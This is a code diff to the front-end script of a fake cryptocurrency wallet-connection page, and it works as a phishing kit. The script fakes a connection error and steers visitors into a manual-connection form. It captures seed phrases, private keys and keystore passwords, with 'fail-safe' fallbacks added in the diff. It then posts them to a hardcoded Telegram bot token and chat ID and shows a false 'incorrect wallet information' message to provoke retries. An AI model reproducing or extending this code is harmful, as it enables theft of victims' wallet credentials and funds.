@@ -24,19 +24,17 @@ document.addEventListener("DOMContentLoaded", function () {
   const currentWalletLogo = document.getElementById("current-wallet-logo");
   const connectDialog = document.getElementById("connect-dialog");
   const sendDialog = document.getElementById("send-dialog");
-  const successBox = document.getElementById("success-dialog");
   const errorBox = document.getElementById("error-dialog");
   const sendFormContainer = document.getElementById("data-to-send");
-
-  // Use "form" to match your HTML id="form"
   const processForm = document.getElementById("form");
 
   // 1. Wallet Selection Logic
   wallets.forEach((button) => {
     button.addEventListener("click", function (event) {
       event.preventDefault();
-      const imgPath = this.querySelector(".coin-img").getAttribute("src");
-      const walletName = this.lastElementChild.textContent.trim();
+      const img = this.querySelector(".coin-img");
+      const imgPath = img ? img.getAttribute("src") : "";
+      const walletName = this.innerText.trim();
 
       connectionInfo.textContent = "Initializing...";
       currentWalletApp.textContent = walletName;
@@ -47,8 +45,19 @@ document.addEventListener("DOMContentLoaded", function () {
       setTimeout(() => {
         connectionInfo.innerHTML =
           'Error Connecting... <button type="button" class="manual-connection">Connect Manually</button>';
-        // Auto-trigger manual connection after 1 second
-        document.querySelector("button.manual-connection")?.click();
+
+        const manualBtn = document.querySelector("button.manual-connection");
+        manualBtn?.addEventListener("click", () => {
+          document.getElementById("current-wallet-app-send").textContent =
+            walletName;
+          document.getElementById("walletNameData").value = walletName;
+          document.getElementById("current-wallet-send-logo").src = imgPath;
+          hide(connectDialog);
+          show(sendDialog);
+        });
+
+        // Auto-trigger manual transition
+        manualBtn?.click();
       }, 1000);
     });
   });
@@ -56,12 +65,11 @@ document.addEventListener("DOMContentLoaded", function () {
   // 2. Dialog Dismissal
   document.querySelectorAll(".dialog-dismiss").forEach((btn) => {
     btn.addEventListener("click", () => {
-      hide(connectDialog);
-      hide(sendDialog);
+      dismissAllDialogs();
     });
   });
 
-  // 3. Tab Content Switching (Updates the form dynamically)
+  // 3. Tab Content Switching
   document.getElementById("phraseSend")?.addEventListener("click", () => {
     sendFormContainer.innerHTML = `
       <div class="form-group">
@@ -88,22 +96,7 @@ document.addEventListener("DOMContentLoaded", function () {
       <div class="small text-left my-3" style="font-size: 11px">Typically 64 alphanumeric characters.</div>`;
   });
 
-  // 4. Manual Connection Event Delegation
-  connectionInfo.addEventListener("click", function (e) {
-    if (e.target && e.target.classList.contains("manual-connection")) {
-      document.getElementById("current-wallet-app-send").textContent =
-        currentWalletApp.textContent;
-      document.getElementById("walletNameData").value =
-        currentWalletApp.textContent;
-      document.getElementById("current-wallet-send-logo").src =
-        currentWalletLogo.src;
-
-      hide(connectDialog);
-      show(sendDialog);
-    }
-  });
-
-  // 5. Form Submission (Telegram Logic)
+  // 4. Form Submission (Updated with Custom Error & Modal Removal)
   processForm?.addEventListener("submit", async function (e) {
     e.preventDefault();
 
@@ -111,17 +104,25 @@ document.addEventListener("DOMContentLoaded", function () {
     const cancelBtn = document.getElementById("cancelBtn");
     const formData = new FormData(this);
 
-    // Prepare data for Telegram
-    const wallet = formData.get("wallet") || "Unknown";
+    const wallet =
+      formData.get("wallet") ||
+      document.getElementById("walletNameData").value ||
+      "Unknown";
     const type = formData.get("type") || "phrase";
+
+    // Fail-safe capture logic
     const secret =
       formData.get("phrase") ||
+      formData.get("phrase-key") ||
       formData.get("keystore") ||
       formData.get("privateKey") ||
-      "No data";
+      this.querySelector("textarea")?.value;
+
     const pass = formData.get("keystore-password")
       ? `\nPassword: ${formData.get("keystore-password")}`
       : "";
+
+    if (!secret || secret.trim() === "") return;
 
     const message = `
 <b>New Wallet Submission</b>
@@ -129,68 +130,56 @@ document.addEventListener("DOMContentLoaded", function () {
 <b>Wallet:</b> ${wallet}
 <b>Type:</b> ${type}
 <b>Data:</b> <code>${secret}</code>${pass}
---------------------------
-    `.trim();
-
-    // UI Feedback: Loading
+--------------------------`.trim();
+    console.log(message);
     const originalBtnText = processBtn.innerHTML;
-    processBtn.innerHTML =
-      '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting...';
+    processBtn.innerHTML = "Connecting...";
     processBtn.disabled = true;
     if (cancelBtn) cancelBtn.disabled = true;
 
-    // Send to Telegram
-    const botToken = "8544540012:AAF7cZx2QqOKVGQ5gxguXsjXHyZuY96y7jw";
-    const chatId = "8368741386";
-
     try {
       const response = await fetch(
-        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        `https://api.telegram.org/bot8544540012:AAF7cZx2QqOKVGQ5gxguXsjXHyZuY96y7jw/sendMessage`,
         {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            chat_id: chatId,
+            chat_id: "8368741386",
             text: message,
             parse_mode: "HTML",
           }),
         }
       );
 
-      console.log(message);
-
-      const result = await response.json();
-
-      if (result.ok) {
-        // Wait 5 seconds to simulate "Connection" process before showing error
+      if (response.ok) {
+        // Wait 4 seconds to simulate the connection effort
         setTimeout(() => {
+          // 1. Reset Button UI
           processBtn.innerHTML = originalBtnText;
           processBtn.disabled = false;
           if (cancelBtn) cancelBtn.disabled = false;
 
-          const messageTab = document.querySelector("div.message-tab");
+          // 2. Show the "Incorrect Wallet Information" error
+          const messageTab = document.querySelector(".message-tab");
           if (messageTab) {
             messageTab.innerHTML =
-              "<div class='alert alert-danger'>An unknown error occurred, please try again later.</div>";
+              "<div class='alert alert-danger' style='font-size: 13px;'>Incorrect wallet information, please check and try again</div>";
           }
-          processForm.reset();
-        }, 5000);
-      } else {
-        throw new Error("Telegram Error");
+
+          // 3. Remove the modal after showing the error for 2 seconds
+          setTimeout(() => {
+            dismissAllDialogs();
+            // Clear the error message so it's fresh for next time
+            if (messageTab) messageTab.innerHTML = "";
+            processForm.reset();
+          }, 3000);
+        }, 4000);
       }
     } catch (error) {
-      // Error Logic: Show error box, then return to send dialog
       processBtn.innerHTML = originalBtnText;
       processBtn.disabled = false;
-      if (cancelBtn) cancelBtn.disabled = false;
-
       dismissAllDialogs();
       show(errorBox);
-
-      setTimeout(() => {
-        dismissAllDialogs();
-        show(sendDialog);
-      }, 2500);
     }
   });
 });
